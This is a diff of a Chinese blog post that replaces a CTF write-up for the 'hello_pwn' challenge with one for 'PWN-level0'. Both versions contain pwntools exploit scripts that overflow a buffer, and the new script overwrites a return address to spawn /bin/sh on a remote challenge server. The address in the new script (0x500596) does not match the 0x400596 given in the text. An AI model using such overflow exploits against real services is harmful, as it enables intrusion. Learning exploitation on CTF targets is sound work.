@@ -157,7 +157,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                [攻防世界]hello_pwn
+                                [攻防世界]PWN-level0
                             </h1>
                             
                                 <!--en-->
@@ -167,67 +167,54 @@
                                         「配枪朱丽叶 - 分部。」
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2021-06-26</a>
+                                Date: <a href="#">2021-06-28</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">2.9
+                                    href="#">0.9
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">738</a></span>
+                                    <span class="post-words">words:<a href="#">200</a></span>
                                     
-                                        <span class="post-category">
-                                Category:
-                                
-                                <a href="https://shawr00t.github.io/HdcmhNKsB/">pwn</a>
-                                
-                            </span>
-                                        
                                 </div>
                                 
                         </header>
                         
                         <div class="post-content">
-                            <p>checksec检查程序保护机制：<br>
-<img src="https://imgpp.com/images/2021/06/26/2021-06-26_123723.png" alt="2021-06-26_123723.png" loading="lazy"></p>
-<p>checksec可以检查程序保护机制，从而查看题目开启了哪些保护机制，有助于对题目的初步分析。</p>
-<ul>
-<li><strong>Arch</strong>：程序位数(查看是多少位的程序，比如32或64位)，也可以查看是哪个微处理器，比如i386为32位微处理器，amd64为64位微处理器(x86架构的延伸产品，称为x86-64，后改名为AMD64)；</li>
-<li><strong>RELRO</strong>：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT(Global Offset Table)攻击。RELEO为&quot;Partial RELRO&quot;，说明我们对GOT表有写权限。</li>
-<li><strong>Stack</strong>：栈溢出监测，查看程序是否开启了Canary防护(一种对函数栈的监测保护：还没等到栈溢出，先返回canary word，从而监测栈溢出情况)。</li>
-<li><strong>NX</strong> ：No-eXecute(不可执行)，相等于windows的DEP(数据执行保护)，就是将攻击者构造的payload和shellcode(一般为系统远程执行命令)所在的内存页标识为不可执行，当攻击代码想要以数据代码伪装成可执行代码时，就会被检测到，从而使CPU抛出异常，从而不执行恶意指令。</li>
-<li><strong>PIE</strong>：内存地址空间分布随机化(ASLR:address space layout randomization)<br>
-根据图片结果可以得知，该题是一个<code>64</code>位的程序，没有开启<code>RELRO</code>，没有开启<code>栈溢出检测</code>，开启了<code>NX</code>，没有开启<code>内存地址空间分布随机化</code>。</li>
-</ul>
-<p>把题目文件拖进IDA中查看伪代码：</p>
-<pre><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+                            <p>checksec查看一下信息，发现其开启了NX保护。</p>
+<pre><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre>
+<p>使用IDA打开，main中只有这几行代码：</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  alarm(0x3Cu);
-  setbuf(stdout, 0LL);
-  puts(&quot;~~ welcome to ctf ~~     &quot;);
-  puts(&quot;lets get helloworld for bof&quot;);
-  read(0, &amp;unk_601068, 0x10uLL);
-  if ( dword_60106C == 1853186401 )
-    sub_400686();
-  return 0LL;
+  write(1, &quot;Hello, World\n&quot;, 0xDuLL);
+  return vulnerable_function(1LL, &quot;Hello, World\n&quot;);
 }
 </code></pre>
-<p><code>alarm(0x3Cu);</code>：<code>alarm()</code>中的参数<code>0x3Cu</code>是十六进制无符号数，即十进制对应60，所以该函数的作用是在程序运行60秒后，给进程发送SIGALRM信号，如果不另编写程序接受处理此信号，则默认结束此程序。<br>
-<code>setbuf(stdout, 0LL);</code>：是重置输出流，要么在网络传输中会传不出去。（本地加不加没区别<br>
-<code>read(0, &amp;unk_601068, 0x10uLL);</code>：read()可以读取数据，第一个参数为0，代表标准输入，第三个参数是输入的个数是0x10，即16个字节。就是从0x601068开始往后读取16个字节。<br>
-sub_400686()直接可以查看flag.txt文件：</p>
-<pre><code class="language-c">__int64 sub_400686()
+<p>双击<code>vulnerable_function()</code>函数，看到如下代码：</p>
+<pre><code class="language-c">ssize_t vulnerable_function()
 {
-  system(&quot;cat flag.txt&quot;);
-  return 0LL;
-}
-</code></pre>
-<p>所以要想拿到flag，必须要让<code>dword_60106C == 1853186401</code>。<br>
-因为能够利用unk_601068的读取数据，所以可以让数据溢出到dword_60106C，给dword_60106C赋值为0x6e756161，即可得到flag。<br>
-<code>0x601068-0x60106c=0x4</code>，看图也能看出来，缓冲区地址和目标地址之间的内存空间大小0x4。向其中填满脏数据即可。<br>
-<img src="https://imgpp.com/images/2021/06/26/2021-06-26_131415.png" alt="2021-06-26_131415.png" loading="lazy"></p>
-<pre><code class="language-python">from pwn import *
-p = remote('111.200.241.244', 64306)
+  char buf; // [rsp+0h] [rbp-80h]
 
-payload=0x4*'c'+p64(1853186401) #p64就是将一个数字转换为字符。
+  return read(0, &amp;buf, 0x200uLL);
+}
+</code></pre>
+<p>这里的rbp是栈基地址寄存器，保存的是当前的栈底地址为0x80，但是可输入的大小为0x200。<br>
+双击<code>&amp;buf</code>看到返回地址：<br>
+<img src="https://imgpp.com/images/2021/06/28/2021-06-28_171430.png" alt="2021-06-28_171430.png" loading="lazy"></p>
+<p>返回地址可以覆盖成<code>callsystem()</code>，地址为0x400596，可命令执行：</p>
+<pre><code class="language-c">int callsystem()
+{
+  return system(&quot;/bin/sh&quot;);
+}
+</code></pre>
+<p>最终脚本如下：</p>
+<pre><code class="language-python">from pwn import *
+
+p = remote('111.200.241.244',63770)
+payload = 'a'*0x80+'a'*0x8+p64(0x500596)
 p.sendline(payload)
 p.interactive()
 </code></pre>
@@ -245,7 +232,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/">https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/</a></span>
+                                                <span><a href="https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/">https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -260,9 +247,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/&sharesource=qzone&title=[攻防世界]hello_pwn&pics=https://shawr00t.github.io/images/avatar.png?v=1624874004929&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/&sharesource=weibo&title=[攻防世界]hello_pwn + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1624874004929 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/&sharesource=qzone&title=[攻防世界]PWN-level0&pics=https://shawr00t.github.io/images/avatar.png?v=1624874004929&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/&sharesource=weibo&title=[攻防世界]PWN-level0 + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1624874004929 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -271,12 +258,6 @@ p.interactive()
                                                                         <span>Tag(s):</span>
                                                                         <span class="tag ">
                         
-                        
-                        <a href="https://shawr00t.github.io/HdcmhNKsB/">#
-                                                pwn
-                                                    </a>
-                                                    
-                                                        
                                                             </span>
                                                                     </div>
                                                                     <div>
@@ -289,13 +270,9 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/">
-                                                                                            [攻防世界]PWN-level0
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/pwn-huan-jing-da-jian/">
-                                                                                                    PWN环境搭建
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/">
+                                                                                                    [攻防世界]hello_pwn
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
